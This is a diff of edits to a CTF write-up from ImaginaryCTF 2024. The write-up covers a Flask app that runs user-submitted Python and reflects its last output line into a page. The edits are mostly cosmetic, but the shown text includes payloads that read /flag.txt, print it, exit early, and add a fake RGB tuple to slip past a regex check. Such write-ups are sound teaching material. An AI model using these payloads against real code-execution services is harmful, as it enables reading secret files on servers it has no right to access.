@@ -115,9 +115,8 @@ def index():
 
         valid = re.compile(r"\([0-9]{1,3}, [0-9]{1,3}, [0-9]{1,3}\)")
 
+        ...
         ### The code below can inject `res` into the HTML template
-        if res == None:
-            return render_template("index.html", rgb=f"rgb({randint(0, 256)}, {randint(0, 256)}, {randint(0, 256)})")
         if valid.match("".join(res.strip().split("\n")[-1])):
             return render_template("index.html", rgb="rgb" + "".join(res.strip().split("\n")[-1])) ### <--- We can exploit this >:)
         ...
@@ -128,11 +127,11 @@ If we can somehow get the flag into the `res` variable, we can probably inject t
 But to do that we need to understand `xec` better:
 
 ```python
-def xec(code): ### <-- `code` is what we input into the textbox
+def xec(code): ### <-- `code` is what we typed into the HTML textbox
     code = code.strip()
     indented = "\n".join(["    " + line for line in code.strip().splitlines()]) ### <-- `code` gets reformatted with idents, as per Python syntax rules
 
-    file = f"/tmp/uploads/code_{md5(code.encode()).hexdigest()}.py" ### <-- Creates a randomly named file
+    file = f"/tmp/uploads/code_{md5(code.encode()).hexdigest()}.py" ### <-- Creates a randomly named file because the file is temporary
     with open(file, 'w') as f:
         f.write("def main():\n")
         f.write(indented) ### <-- Writes our `code` to the file such that our `code` becomes the body of the `main` function
@@ -196,7 +195,7 @@ def index():
     ...
 ```
 
-This means if we use the above payload, we'll only end up injecting the output of `rgb_parse(main())` (which is just some tuple of red-green-blue values)
+This means if we use the above payload, we'll only end up injecting the output of `rgb_parse(main())` (which is just some tuple of red-green-blue values).
 
 We need to modify our payload such that the flag is **in the last line printed to standard out**.
 This is pretty straightforward; we can just end the program as soon as we print the flag.
@@ -204,7 +203,7 @@ This is pretty straightforward; we can just end the program as soon as we print 
 ```python
 # New and improved payload
 from pathlib import Path
-import sys ### <-- Module with the `.exit()` function
+import sys ### <--
 flag = Path("/flag.txt").read_text()
 print(flag)
 sys.exit() ### <-- Ends the program, ensuring that the only text bound to the `output` variable is the flag 
@@ -230,7 +229,7 @@ In other words, it just checks that our input contains one or more rgb tuples. F
 No problem, we can add that:
 
 ```python
-# Payload prime
+# Payload prime 😎
 from pathlib import Path
 import sys
 bypass_color_check = "(0, 0, 0)"
@@ -240,13 +239,15 @@ sys.exit()
 ```
 
 Then we just check for the flag wherever `res` was injected.
-`res` was bound to the `rgb` keyword in the `render_template` function:
+`res` is bound to the `rgb` keyword in the `render_template` function:
 
 ```python
 def index():
     ...
     if valid.match("".join(res.strip().split("\n")[-1])):
         return render_template("index.html", rgb="rgb" + "".join(res.strip().split("\n")[-1]))
+        ###                                 ~~~~~~              ~~~~~
+
     ...
 ```
 
@@ -272,4 +273,4 @@ After submitting our payload, we find the flag!
 
 Writeup by ImAKappa, for ImaginaryCTF 2024.
 
-2024-07-27
+Last edited 2024-07-27.
